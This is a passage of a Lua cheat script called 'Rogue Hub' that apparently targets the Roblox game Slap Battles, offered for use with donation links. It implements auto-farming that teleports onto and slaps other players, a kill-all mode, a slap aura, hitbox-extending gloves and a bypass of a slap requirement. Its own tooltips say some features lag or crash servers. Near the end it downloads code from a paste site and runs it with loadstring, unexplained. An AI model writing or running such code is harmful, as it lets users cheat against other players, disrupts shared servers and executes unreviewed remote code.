                if target ~= localPlr and target.Character ~= nil and localPlr.Character ~= nil and target.Character:FindFirstChild("inMatch").Value and localPlr.Character:FindFirstChild("inMatch").Value and target.Character:FindFirstChild("Glider") == nil and localPlr.Character:FindFirstChild("Glider") == nil and target.Character:FindFirstChild("HumanoidRootPart") and localPlr.Character:FindFirstChild("HumanoidRootPart") and target.Character:FindFirstChild("Dead") == nil and target.Character.Ragdolled.Value == false and localPlr.Character.Ragdolled.Value == false and getgenv().slapFarm then
                    --if workspace:FindFirstChild("BusModel") ~= nil and workspace:FindFirstChild("BusModel").Welds:FindFirstChild(localPlr.Name) ~= nil or workspace:FindFirstChild("BusModel") ~= nil and workspace:FindFirstChild("BusModel").Welds:FindFirstChild(target.Name) ~= nil then return end
                    
                    local gotAcid = false
                    local gotLava = false
                    
                    if getTool() ~= nil and getgenv().slapFarm then
                        pcall(function()
                            localPlr.Character.HumanoidRootPart.Touched:Connect(function(part)
                                if part.Name == "acidGod" and gotAcid == false then
                                    gotAcid = true
                                elseif part.Name == "lavaGod" and gotLava == false then
                                    gotLava = true
                                end
                            end)
                            
                            localPlr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.StrafingNoPhysics)
                            
                            repeat task.wait()
                                if getTool().Name == "Pack-A-Punch" then
                                    localPlr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0,6.3,0)
                                    game:GetService("ReplicatedStorage").Events.Slap:FireServer(target.Character["Right Arm"])
                                else
                                    localPlr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,3.5)
                                    getTool():Activate()
                                end
                            until target.Character:FindFirstChild("Dead") ~= nil and target.Character:FindFirstChild("Dead").Value or getgenv().slapFarm == false or gotAcid or gotLava
                            
                            localPlr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
                        end)
                    end
                end
            end
        end
    end
end)

local toolName = "Auto farm slaps, works best when paired with auto join (ban warning from mods)"

if game.PlaceId == 9431156611 then toolName = "Kills all the players in your server (ban warning from mods)" end
    
farmTog:AddToolTip(toolName)

if game.PlaceId ~= 9431156611 then
    if game.PlaceId ~= 11520107397 then
        local baller = gloveSec:CreateToggle("Baller Spammer (PATCHED, DONT USE)", false, function(bool)
            getgenv().settings.ballerFarm = bool
            saveSettings()
            
            if getgenv().settings.ballerFarm and localPlr.leaderstats.Slaps.Value >= 20000 and localPlr.leaderstats.Glove.Value ~= "Baller" and not localPlr.Character:FindFirstChild("entered") then
                fireclickdetector(workspace.Lobby.Baller.ClickDetector)
            elseif localPlr.leaderstats.Slaps.Value <= 20000 and getgenv().settings.ballerFarm then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Rogue Hub Error",
                    Text = "You don't have enough slaps for the baller glove! (20000 Slaps)",
                    Duration = 5
                })
                return
            end
        end)
        
        baller:AddToolTip("spam spawns ballers and slaps them, incredibly op and can even crash servers (20k slaps required)")
        
        if keypress and keyrelease then
            local fartTog = gloveSec:CreateToggle("Fart Spam (FE)", getgenv().settings.spamFart or false, function(bool)
                getgenv().settings.spamFart = bool
                saveSettings()
            end)
            
            fartTog:AddToolTip("no explanation needed, only works for the default glove") 
        end
        
        local rockTog = gloveSec:CreateToggle("Rock Spam (FE)", getgenv().settings.spamRock or false, function(bool)
            getgenv().settings.spamRock = bool
            
            if not getgenv().settings.spamRock and getTool() ~= nil and getTool().Name == "Diamond" then
                game:GetService("ReplicatedStorage").DeactivateRockmode:FireServer()
            end
            
            saveSettings()
        end)
        
        rockTog:AddToolTip("spams the rock ability on the glove, only works for diamond glove")
        
        local spamEquip = gloveSec:CreateToggle("Spam Equip Gloves", getgenv().settings.spamGlove or false, function(bool)
            getgenv().settings.spamGlove = bool
            saveSettings()
        end)
        
        spamEquip:AddToolTip("spams equips all gloves in the game, useful for lagging servers. (requires you to be in lobby)")
    end
end

if game.PlaceId ~= 9431156611 then
    local equip = gloveSec:CreateToggle("Auto Equip", getgenv().settings.autoEquip or false, function(bool)
        getgenv().settings.autoEquip = bool
        saveSettings()
    end)
    
    equip:AddToolTip("Automatically equips when you left click and your glove is not equipped.")
        
    localPlr:GetMouse().Button1Down:Connect(function()
        if getgenv().settings.autoEquip and not getgenv().slapFarm and localPlr.Character:FindFirstChild("entered") ~= nil and getBackpackTool() ~= nil then
            localPlr.Character.Humanoid:EquipTool(getBackpackTool())
            getTool():Activate()
        end
    end)
end

gloveSec:CreateToggle("Glove Extender", getgenv().settings.gloveExtend or false, function(bool)
    getgenv().settings.gloveExtend = bool
    saveSettings()
end)

local extendDrop = gloveSec:CreateDropdown("Extender Type", {"Meat Stick", "Pancake", "Growth", "North Korea Wall", "Slight Extend"}, function(option)
	getgenv().settings.extendOption = option
	saveSettings()
end)

extendDrop:SetOption(getgenv().settings.extendOption or "Meat Stick")

if game.PlaceId ~= 9431156611 then
    -- Auto Join
    local joinSec = mainTab:CreateSection("Joining")
    
    local autoEnabled = joinSec:CreateToggle("Auto Join", getgenv().settings.autoJoin or false, function(bool)
        getgenv().settings.autoJoin = bool
        saveSettings()
    end)
    
    autoEnabled:AddToolTip("Automatically join an arena of your choice.")
    
    local joinDrop = joinSec:CreateDropdown("Auto join to:", {"Normal Arena","Default Only Arena"}, function(option)
    	getgenv().settings.joinOption = option
    	saveSettings()
    end)
    
    joinDrop:SetOption(getgenv().settings.joinOption or "Normal Arena")
    
    local joinRoyale = joinSec:CreateButton("Join Slap Royale", function()
        game:GetService("TeleportService"):Teleport(9426795465)
    end)
    
    joinRoyale:AddToolTip("Joins slap royale for you (BYPASS 1000 SLAPS REQUIREMENT)")
end

-- Slap Aura

local auraSec = mainTab:CreateSection("Slap Aura")

local hipBackup = localPlr.Character.Humanoid.HipHeight

local slapAuraTog = auraSec:CreateToggle("Enabled", false, function(bool)
    getgenv().settings.auraSlap = bool

    if getgenv().settings.auraSlap and getgenv().settings.auraOption == "Legit" then
        getTool().Glove.Touched:Connect(function(part)
            if part.Parent:FindFirstChildOfClass("Humanoid") and getgenv().settings.auraSlap and getgenv().settings.auraOption == "Legit" and part.Parent:FindFirstChild("Reversed") == nil and not getgenv().slapFarm then
                getTool():Activate()
                task.wait(0.3)
            end
        end)
    end
    
    if game.PlaceId ~= 9431156611 and getgenv().isLoaded and getgenv().settings.auraSlap and getgenv().settings.auraOption == "Blatant" then
        while wait() and getgenv().isLoaded do
            if getgenv().settings.auraSlap and getgenv().settings.auraOption == "Blatant" and not getgenv().slapFarm then
                for _, target in ipairs(game:GetService("Players"):GetPlayers()) do
                    if getTool() and target.Character and target.Character:FindFirstChild("Humanoid") and localPlr.Character and localPlr.Character:FindFirstChild("Humanoid") and target.Character:FindFirstChild("rock") == nil and target.Character:FindFirstChild("Reversed") == nil and getgenv().settings.auraOption == "Blatant" and target:DistanceFromCharacter(localPlr.Character.HumanoidRootPart.Position) <= 20.1 and getTool().Name == "Default" then
                        game:GetService("ReplicatedStorage").b:FireServer(target.Character.HumanoidRootPart)
                        task.wait(0.3)
                    end
                end
            end
        end
    elseif game.PlaceId == 9431156611 and getgenv().isLoaded and getgenv().settings.auraSlap and getgenv().settings.auraOption == "Blatant" then
        while wait() and getgenv().isLoaded do
            if getgenv().settings.auraSlap and getgenv().settings.auraOption == "Blatant" and not getgenv().slapFarm then
                if game.PlaceId == 9431156611 and not localPlr.Character:FindFirstChild("Glider") then
                    for _, target in ipairs(game:GetService("Players"):GetPlayers()) do
                        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and not target.Character:FindFirstChild("Dead") and not target.Character.Ragdolled.Value and target.Character and target.Character:FindFirstChild("Humanoid") ~= nil and getgenv().settings.auraOption == "Blatant" and target:DistanceFromCharacter(localPlr.Character.HumanoidRootPart.Position) <= 20.1 and not localPlr.Character.Ragdolled.Value and not localPlr.Character:FindFirstChild("Dead") then
                            game:GetService("ReplicatedStorage").Events.Slap:FireServer(target.Character.HumanoidRootPart)
                        end
                    end
                end
            end
        end
    end
end)

slapAuraTog:AddToolTip("automatically slaps any player which is 20 studs in distance.")

local auraDrop = auraSec:CreateDropdown("Type", {"Legit","Blatant"}, function(option)
	getgenv().settings.auraOption = option
	saveSettings()
	
	if getgenv().settings.auraSlap and getgenv().settings.auraOption == "Blatant" then
	    if game.PlaceId ~= 9431156611 then
    	    game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Rogue Hub Note",
                Text = "Blatant Type only works on the default glove, use legit for any glove type.",
                Duration = 5
            })
        end
	end
end)

auraDrop:SetOption(getgenv().settings.auraOption or "Blatant")

-- Items

if game.PlaceId == 9431156611 then
    local itemSec = mainTab:CreateSection("Items")
    
    local item = itemSec:CreateToggle("Auto Get All Items", getgenv().settings.autoItems or false, function(bool)
        getgenv().settings.autoItems = bool
        saveSettings()
    end)
    
    item:AddToolTip("Automatically finds items in the map and grabs them for you.")
    
    itemSec:CreateButton("Get All Items", function()
        if localPlr.Character and localPlr.Character:FindFirstChild("inMatch").Value then
            for _, v in pairs(workspace:GetChildren()) do
                if v:IsA("Tool") and v.Handle:FindFirstChild("TouchInterest") ~= nil then
                    localPlr.Character.Humanoid:EquipTool(v)
                end
            end
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Rogue Hub Error",
                Text = "You aren't in the game yet! Or something else has happened.",
                Duration = 5
            })
        end
    end)
    
    itemSec:CreateButton("Use All Items", function()
        if localPlr.Character and localPlr.Character:FindFirstChild("inMatch").Value then
            for _, v in pairs(localPlr.Backpack:GetChildren()) do
                if v:IsA("Tool") and v.Handle:FindFirstChild("Glove") == nil and v.Name ~= "Bomb" and v.Name ~= "Witch Brew" then
                    -- assume its an item
                    
                    localPlr.Character.Humanoid:EquipTool(v)
                    v:Activate()
                end
            end
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Rogue Hub Error",
                Text = "You aren't in the game yet! Or something else went wrong...",
                Duration = 5
            })
        end
    end)
    
    local bomb = itemSec:CreateButton("Bus Bomb", function()
        if localPlr.Character and localPlr.Character:FindFirstChild("inMatch").Value and workspace:FindFirstChild("BusModel") and workspace:FindFirstChild("BusModel").Welds:FindFirstChild(localPlr.Name) then
            for _, v in pairs(localPlr.Backpack:GetChildren()) do
                if v:IsA("Tool") and not v.Handle:FindFirstChild("Glove") and v.Name == "Bomb" then
                    localPlr.Character.Humanoid:EquipTool(v)
                    v:Activate()
                end
            end
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Rogue Hub Error",
                Text = "You aren't in the bus! Or something else went wrong...",
                Duration = 5
            })
        end
    end)
    
    bomb:AddToolTip("uses bombs from your inventory while in the bus.")
end

-- Visuals

local visualSec = mainTab:CreateSection("Visuals")

if game.PlaceId ~= 9431156611 then
    local rainbowVoidTog = visualSec:CreateToggle("Rainbow Void", getgenv().settings.voidRainbow or false, function(bool)
        getgenv().settings.voidRainbow = bool
        saveSettings()
    end)
    
    rainbowVoidTog:AddToolTip("changes the void's color to rainbow")
    
    local forceVoidTog = visualSec:CreateToggle("ForceField Void", getgenv().settings.voidForce or false, function(bool)
        getgenv().settings.voidForce = bool
        saveSettings()
    end)

    forceVoidTog:AddToolTip("changes the void's material to a forcefield")
end

local forcePlayerTog = visualSec:CreateToggle("ForceField Player", getgenv().settings.playerForce or false, function(bool)
    getgenv().settings.playerForce = bool
    saveSettings()
end)

forcePlayerTog:AddToolTip("changes your player's model to a forcefield")

if game.PlaceId ~= 9431156611 then
    local nameTagHide = visualSec:CreateToggle("Hide Nametag", getgenv().settings.playerNametag or false, function(bool)
        getgenv().settings.playerNametag = bool
        saveSettings()
    end)
    
    nameTagHide:AddToolTip("hides your player's nametag")
end

local nameTagHideAll = visualSec:CreateToggle("Hide All Nametags", getgenv().settings.playerNametagAll or false, function(bool)
    getgenv().settings.playerNametagAll = bool
    saveSettings()
end)

nameTagHideAll:AddToolTip("hides all player's nametags")

local fovSlider = visualSec:CreateSlider("Field of View", 70,120,getgenv().settings.fov or 70,true, function(value)
	getgenv().settings.fov = value
	workspace.CurrentCamera.FieldOfView = getgenv().settings.fov
	saveSettings()
end)

fovSlider:AddToolTip("changes the camera's FOV")

-- contribution made by littlepriceonu#0001
if game.PlaceId ~= 9431156611 then
    local NoCamEffects = visualSec:CreateButton("Disable Camera Effects", function()
        workspace.CurrentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
            workspace.CurrentCamera.FieldOfView = getgenv().settings.fov or 70
        end)
    
        if localPlr.Character:FindFirstChild("Humanoid") then
            localPlr.Character.Humanoid:GetPropertyChangedSignal("CameraOffset"):Connect(function()
               localPlr.Character.Humanoid.CameraOffset = Vector3.new(0,0,0)
            end)
        end
    
        localPlr.CharacterAdded:Connect(function(Character)
            Character.Humanoid:GetPropertyChangedSignal("CameraOffset"):Connect(function()
               Character.Humanoid.CameraOffset = Vector3.new(0,0,0)
            end)
        end)
        
        if getconnections then
            for _, v in ipairs(game:GetService("ReplicatedStorage"):GetChildren()) do
               if v.Name:match("Screenshake") then
                    for _, connection in ipairs(getconnections(v.OnClientEvent)) do
                        connection:Disable()
                    end
                end
            end
        end
        
        for _,v in pairs(game.Lighting:GetChildren()) do
            if v.Name ~= "DepthOfField" or v.Name ~= "Bloom" or v.Name ~= "ColorCorrection" then
                v:Destroy()    
            end
        end
        
        game.Lighting.ChildAdded:Connect(function(child)
            if child.Name ~= "DepthOfField" or child.Name ~= "Bloom" or child.Name ~= "ColorCorrection" then
                child:Destroy()    
            end
        end)
    end)
    
    NoCamEffects:AddToolTip("Removes all of the games built in camera FOV and camera shake effects.")
end

-- Info

local infoTab = window:CreateTab("Extra")
local uiSec = infoTab:CreateSection("UI Settings")

local uiColor = uiSec:CreateColorpicker("UI Color", function(color)
	window:ChangeColor(color)
end)

uiColor:UpdateColor(Config.Color)

local uiTog = uiSec:CreateToggle("UI Toggle", nil, function(bool)
	window:Toggle(bool)
end)

uiTog:CreateKeybind(tostring(Config.Keybind):gsub("Enum.KeyCode.", ""), function(key)
	if key == "Escape" or key == "Backspace" then key = "NONE" end
	
    if key == "NONE" then return else Config.Keybind = Enum.KeyCode[key]; writefile("/Rogue Hub/Configs/Keybind.ROGUEHUB", game:GetService("HttpService"):JSONEncode({Key = key})) end
end)

uiTog:SetState(true)

local uiRainbow = uiSec:CreateToggle("Rainbow UI", nil, function(bool)
	getgenv().rainbowUI = bool
    
    while getgenv().rainbowUI and task.wait() do
        local hue = tick() % 10 / 10
        local rainbow = Color3.fromHSV(hue, 1, 1)
            
        window:ChangeColor(rainbow)
        uiColor:UpdateColor(rainbow)
    end
end)

-- Credits

local infoSec = infoTab:CreateSection("Credits")

local req = http_request or request or syn.request

infoSec:CreateButton("Founder of Rogue Hub: Kitzoon#7750", function()
    setclipboard("Kitzoon#7750")
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Rogue Hub Note",
        Text = "Copied Kitzoon's discord username and tag to your clipboard.",
        Duration = 5
    })
end)

infoSec:CreateButton("Help with a lot: Kyron#6083", function()
    setclipboard("Kyron#6083")
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Rogue Hub Note",
        Text = "Copied Kyron's discord username and tag to your clipboard.",
        Duration = 5
    })
end)

infoSec:CreateButton("God of finding exploits: BluBambi#9867", function()
    setclipboard("BluBambi#9867")
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Rogue Hub Note",
        Text = "Copied BluBambi's discord username and tag to your clipboard.",
        Duration = 5
    })
end)

infoSec:CreateButton("Consider donating on PayPal!", function()
    setclipboard("https://paypal.me/RogueHub")
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Rogue Hub Note",
        Text = "Copied our PayPal donate page to your clipboard, donate any amount to it!",
        Duration = 5
    })
end)

infoSec:CreateButton("Consider donating on Bitcoin!", function()
    setclipboard("bc1qh8axzk8udu7apye7l384s5m6rt4d24rdwgkkcz")
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Rogue Hub Note",
        Text = "Copied our Bitcoin address to your clipboard, donate any amount to it!",
        Duration = 5
    })
end)

infoSec:CreateButton("Join us on discord!", function()
	if req then
        req({
            Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",
            
            Headers = {
                ["Content-Type"] = "application/json",
                ["origin"] = "https://discord.com",
            },
                    
            Body = game:GetService("HttpService"):JSONEncode(
            {
                ["args"] = {
                ["code"] = "c4xWZ4G4bx",
                },
                
                ["cmd"] = "INVITE_BROWSER",
                ["nonce"] = "."
            })
        })
    else
        setclipboard("https://discord.gg/c4xWZ4G4bx")
    
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Rogue Hub Note",
            Text = "Copied our discord server to your clipboard.",
            Duration = 5
        })
    end
end)

-- Game Information

local gameSec = infoTab:CreateSection("Game Information")

local playtime = 0
local playLabel = gameSec:CreateLabel("Playtime In Seconds: " .. playtime)

if game.PlaceId ~= 9431156611 then
    slapLabel = gameSec:CreateLabel("Players Slapped: " .. timeSlapped)
end

ragdollLabel = gameSec:CreateLabel("Times Ragdolled: " .. timeRagdolled)

-- Misc
local miscSec = infoTab:CreateSection("Miscellaneous")
local zoomBackup = localPlr.CameraMaxZoomDistance

local server = miscSec:CreateButton("Serverhop", function()
    -- credits to: inf yield for there serverhop
    local serverList = {}
    
    for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
    	if v.playing and type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
    		serverList[#serverList + 1] = v.id
    	end
    end
    
    if #serverList > 0 then
    	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, serverList[math.random(1, #serverList)])
    else
        error("No servers found")
    end
end)

server:AddToolTip("Joins a different server than the one you're currently in.")

local camZoom = miscSec:CreateToggle("Infinite Zoom", false, function(bool)
    if bool then
        localPlr.CameraMaxZoomDistance = math.huge
    else
        localPlr.CameraMaxZoomDistance = zoomBackup
    end
end)

camZoom:AddToolTip("Lets you infinitely change your camera's zoom.")

local asset = getcustomasset or syn and getsynasset

if asset and isfile and writefile then
    local soundsToggled = miscSec:CreateToggle("Toggle Sounds", false, function(bool)
        getgenv().settings.toggleSounds = bool
    end)
    
    soundsToggled:AddToolTip("plays a sound when enabling or disabling a feature.")
end

game:GetService("RunService").RenderStepped:Connect(function()
    if game.PlaceId ~= 9431156611 and localPlr ~= nil and getTool() ~= nil and localPlr.Character:FindFirstChild("entered") ~= nil or game.PlaceId == 9431156611 and localPlr ~= nil and getTool() ~= nil and localPlr.Character:FindFirstChild("inMatch").Value then
        if getgenv().settings.gloveExtend and getgenv().settings.extendOption == "Meat Stick" and getTool():FindFirstChild("Glove").Size ~= Vector3.new(0, 25, 2) then
            getTool().Glove.Transparency = 0.5
            getTool().Glove.Size = Vector3.new(0, 25, 2)
        elseif getgenv().settings.gloveExtend and getgenv().settings.extendOption == "Pancake" and getTool():FindFirstChild("Glove").Size ~= Vector3.new(0, 25, 25) then
            getTool().Glove.Transparency = 0.5
            getTool().Glove.Size = Vector3.new(0, 25, 25)
        elseif getgenv().settings.gloveExtend and getgenv().settings.extendOption == "Growth" and getTool():FindFirstChild("Glove").Size ~= Vector3.new(25, 25, 25) then
            getTool().Glove.Transparency = 0.5
            getTool().Glove.Size = Vector3.new(25, 25, 25)
        elseif getgenv().settings.gloveExtend and getgenv().settings.extendOption == "North Korea Wall" and getTool():FindFirstChild("Glove").Size ~= Vector3.new(0, 3.5, 2) then
            getTool().Glove.Transparency = 0.5
            getTool().Glove.Size = Vector3.new(45, 0, 45)
        elseif getgenv().settings.gloveExtend and getgenv().settings.extendOption == "Slight Extend" and getTool():FindFirstChild("Glove").Size ~= Vector3.new(0, 3.5, 2) then
            getTool().Glove.Transparency = 0
            getTool().Glove.Size = Vector3.new(3, 3, 3.7)
        elseif getgenv().settings.gloveExtend == false then
            getTool().Glove.Transparency = 0
            getTool().Glove.Size = Vector3.new(2.5, 2.5, 1.7)
        end
        
        if getgenv().settings.hipHeight and localPlr.Character.Humanoid.HipHeight ~= getgenv().settings.hipHeightNum then
            localPlr.Character.Humanoid.HipHeight = getgenv().settings.hipHeightNum
        else
            localPlr.Character.Humanoid.HipHeight = hipBackup
        end
        
        if getgenv().settings.ballerFarm and game.PlaceId ~= 9431156611 then
            game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
        
            for _,v in pairs(workspace:GetChildren()) do
                if string.find(v.Name, "BallerSlappyCrazySlots") and v:FindFirstChild("Torso") then
                    game:GetService("ReplicatedStorage").GeneralHit:FireServer(v.Torso)
                end
            end
        end
        
        if not isTyping and getgenv().settings.infJump and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.Space) then
            localPlr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        
        if getgenv().settings.slappleFarm and game.PlaceId ~= 9431156611 then
            for _,v in pairs(workspace.Arena:GetDescendants()) do
                if getgenv().settings.slappleFarm and string.find(v.Name, "Slapple") and v:FindFirstChild("Glove") and v.Glove:FindFirstChildOfClass("TouchTransmitter") then
                    firetouchinterest(localPlr.Character.HumanoidRootPart, v.Glove, 0)
                    firetouchinterest(localPlr.Character.HumanoidRootPart, v.Glove, 1)
                    
                    wait(0.05)
                end
            end
        end

        if task.wait(2) and getTool() ~= nil and getgenv().settings.autoClicker and not getgenv().slapFarm then
            getTool():Activate()
        end
        
        if getTool() ~= nil and getgenv().settings.infGold and getTool().Name == "Golden" then
            game:GetService("ReplicatedStorage").Goldify:FireServer(true)
        end
        
        if getgenv().settings.noTimestop then
            for _, v in next, localPlr.Character:GetChildren() do
                if v:IsA("Part") or v:IsA("MeshPart") and v.Anchored then
                    v.Anchored = false
                end
            end
        end
        
        if getgenv().settings.noRock and game.PlaceId ~= 9431156611 then
            for _, target in next, game:GetService("Players"):GetPlayers() do
                if localPlr ~= target and target.Character and target.Character:FindFirstChild("rock") and target.Character.rock:FindFirstChild("TouchInterest") then
                    target.Character:FindFirstChild("rock").TouchInterest:Destroy()
                    
                    if target.leaderstats.Glove.Value == "MEGAROCK" then
                        target.Character.rock:Destroy()
                    end
                end
            end
        end
        
        if getgenv().settings.autoItems and game.PlaceId == 9431156611 and localPlr.Character:FindFirstChild("inMatch").Value then
            for _, v in pairs(workspace:GetChildren()) do
                if v:IsA("Tool") and v.Handle:FindFirstChild("TouchInterest") ~= nil then
                    firetouchinterest(localPlr.Character.HumanoidRootPart, v.Handle, 0)
                    firetouchinterest(localPlr.Character.HumanoidRootPart, v.Handle, 1)
                end
            end
        end
        
        if getgenv().settings.playerForce then
            for _, v in next, localPlr.Character:GetChildren() do
                if v:IsA("Part") or v:IsA("MeshPart") then
                    v.Material = "ForceField"
                end
            end
        else
            for _, v in next, localPlr.Character:GetChildren() do
                if v:IsA("Part") or v:IsA("MeshPart") then
                    v.Material = "Plastic"
                end
            end 
        end
        
        if getgenv().settings.spamFart and keypress and not isTyping and keyrelease and getTool().Name == "Default" and game.PlaceId ~= 9431156611 then
            keypress(0x45)
            keyrelease(0x45)
        end
        
        if getgenv().settings.spamRock and getTool().Name == "Diamond" and not getgenv().slapFarm and game.PlaceId ~= 9431156611 then
            game:GetService("ReplicatedStorage").Rockmode:FireServer()
        end
        
        if getgenv().settings.spin and localPlr:GetMouse().Icon ~= "rbxasset://textures/MouseLockedCursor.png" and not getgenv().slapFarm then
            localPlr.Character.HumanoidRootPart.CFrame = localPlr.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(getgenv().settings.spinSpeed), 0)
        end
    end
    
    if game.PlaceId ~= 9431156611 and getgenv().settings.playerNametag and localPlr.Character and localPlr.Character.Head:FindFirstChild("Nametag") and localPlr.Character.Head.Nametag.TextLabel.TextTransparency ~= 1 then
        localPlr.Character.Head.Nametag.TextLabel.TextTransparency = 1
    elseif game.PlaceId ~= 9431156611 and not getgenv().settings.playerNametag and localPlr.Character and localPlr.Character.Head:FindFirstChild("Nametag") and localPlr.Character.Head.Nametag.TextLabel.TextTransparency == 1 then
        localPlr.Character.Head.Nametag.TextLabel.TextTransparency = 0
    end
    
    if getgenv().settings.playerNametagAll then
        for _,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v ~= localPlr and v.Character and v.Character.Head:FindFirstChild("Nametag") and v.Character.Head.Nametag.TextLabel.TextTransparency ~= 1 then
                v.Character.Head.Nametag.TextLabel.TextTransparency = 1
            end
        end
    elseif not getgenv().settings.playerNametagAll then
        for _,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v ~= localPlr and v.Character and v.Character.Head:FindFirstChild("Nametag") and v.Character.Head.Nametag.TextLabel.TextTransparency == 1 then
                v.Character.Head.Nametag.TextLabel.TextTransparency = 0
            end
        end
    end
    
    if getgenv().settings.spamGlove and game.PlaceId ~= 9431156611 and not localPlr.Character:FindFirstChild("entered") then
        for _,v in pairs(workspace.Lobby:GetChildren()) do
            if v:FindFirstChild("ClickDetector") then
                fireclickdetector(v.ClickDetector)
            end
        end
    end
    
    if getgenv().settings.errorSound and game.PlaceId ~= 9431156611 then
        game:GetService("ReplicatedStorage").ErrorDeath:FireServer()
    end
    
    if getgenv().settings.autoJoin and getgenv().settings.joinOption == "Normal Arena" then
        if game.PlaceId == 9431156611 then return end
        
        if not localPlr.Character:FindFirstChild("entered") and localPlr.Character:FindFirstChild("HumanoidRootPart") then
            repeat wait(0.5)
                firetouchinterest(localPlr.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 0)
                firetouchinterest(localPlr.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 1)
            until localPlr.Character:FindFirstChild("entered") ~= nil
        end
    elseif getgenv().settings.autoJoin and getgenv().settings.joinOption == "Default Only Arena" then
        if game.PlaceId == 9431156611 then return end
        
        if not localPlr.Character:FindFirstChild("entered") and localPlr.Character:FindFirstChild("HumanoidRootPart") then
            repeat wait(0.5)
                firetouchinterest(localPlr.Character.HumanoidRootPart, workspace.Lobby.Teleport2, 0)
                firetouchinterest(localPlr.Character.HumanoidRootPart, workspace.Lobby.Teleport2, 1)
            until localPlr.Character:FindFirstChild("entered") ~= nil
        end
    end
    
    if getgenv().settings.voidRainbow and game.PlaceId ~= 9431156611 then
        local hue = tick() % 10 / 10
        local rainbow = Color3.fromHSV(hue, 1, 1)
        
        workspace.dedBarrier.Transparency = 0
        workspace.dedBarrier.Color = rainbow
        
        workspace.arenaVoid.Transparency = 0
        workspace.arenaVoid.Color = rainbow
    else
        if game.PlaceId == 9431156611 then return end
        
        if not getgenv().settings.voidForce then
            workspace.dedBarrier.Transparency = 1
            workspace.arenaVoid.Transparency = 1
        end
        
        workspace.dedBarrier.Color = Color3.fromRGB(163, 162, 165)
        workspace.arenaVoid.Color = Color3.fromRGB(163, 162, 165)
    end
    
    if getgenv().settings.voidForce and game.PlaceId ~= 9431156611 then
        workspace.dedBarrier.Transparency = 0
        workspace.dedBarrier.Material = "ForceField"
        
        workspace.arenaVoid.Transparency = 0
        workspace.arenaVoid.Material = "ForceField"
    else
        if game.PlaceId == 9431156611 then return end
        
        if not getgenv().settings.voidRainbow then
            workspace.dedBarrier.Transparency = 1
            workspace.arenaVoid.Transparency = 1
        end
        
        workspace.dedBarrier.Material = "Plastic"
        workspace.arenaVoid.Material = "Plastic"
    end
end)

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Rogue Hub Message",
    Text = "Sucessfully Loaded!",
    Duration = 5
})

sound:Destroy()
getgenv().isLoaded = true

print("passed")
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/D4TEYrw5Xj/0",true))()

task.wait(5)

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Rogue Hub Fact",
    Text = "Rogue hub has over 3500+ lines of code!",
    Duration = 10
})

while wait() do
    if game.PlaceId ~= 9431156611 then
        slapLabel:UpdateText("Players Slapped: " .. timeSlapped)
    end
    
    ragdollLabel:UpdateText("Times Ragdolled: " .. timeRagdolled)
    
    while wait(1) do
        playtime = playtime + 1
        playLabel:UpdateText("Playtime In Seconds: " .. playtime)
    end
end
